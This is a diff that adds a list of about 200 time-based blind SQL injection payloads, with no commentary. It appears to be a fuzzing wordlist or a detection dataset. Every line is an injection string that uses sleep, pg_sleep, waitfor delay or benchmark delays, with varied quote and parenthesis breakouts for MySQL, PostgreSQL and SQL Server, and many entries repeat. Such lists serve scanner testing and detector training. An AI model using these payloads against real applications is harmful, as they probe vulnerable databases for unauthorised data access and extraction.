@@ -1,0 +1,200 @@
+waitfor delay '0:0:5' and    (    (     (  "lpeo"  =  "lpeo
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '
+1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'
+1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '
+1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar
+1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq
+1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim
+1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf
+1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs
+1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg
+1"   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --
+1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1"   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   "chvi" like "chvi
+1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1" or elt  (  6272  =  6272,sleep  (  5   )    )    and "hvic" like "hvic
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --
+1%" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1" or elt  (  6272  =  6272,sleep  (  5   )    )    and "hvic" like "hvic
+select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --
+select sleep  (  5  )   and    (    (     (  "lczw"  =  "lczw
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '
+1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #
+1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq
+1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915
+1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--
+1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '
+1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '
+1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '
+1" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '
+1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  '
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1"   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'
+1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +'
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1"   )    )     )   waitfor delay '0:0:5' and    (    (     (  "ckht"  =  "ckht
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  "poik"  =  "poik
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl
+1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1" or elt  (  6272  =  6272,sleep  (  5   )    )    and "hvic" like "hvic
+1"  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1"  )   and sleep  (  5  )   and   (  "fsuf" like "fsuf
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"   )    )     )   waitfor delay '0:0:5' and    (    (     (  "ckht"  =  "ckht
+1"   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr
+1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1"   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  '
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '
+1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  '
+1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy
+1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim
+select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf
+select sleep  (  5  )   and    (    (   'keoy'  =  'keoy
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '
+1%" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and "%"  =  "
+1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #
+select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf
+select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  '
+1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--
+1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +'
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  "poik"  =  "poik
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  '
+1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||'
+1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1"   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #
+1" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl
+1"   )    )     )   waitfor delay '0:0:5' and    (    (     (  "ckht"  =  "ckht
+1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847
+1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele
+1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar
+1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+waitfor delay '0:0:5' and    (    (     (  "lpeo"  =  "lpeo
+1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--
+1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar
+1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1"   )    )     )   waitfor delay '0:0:5' and    (    (     (  "ckht"  =  "ckht
+1"   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847
+1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||'
+select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx
+waitfor delay '0:0:5' and    (    (     (  "lpeo"  =  "lpeo
+1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim
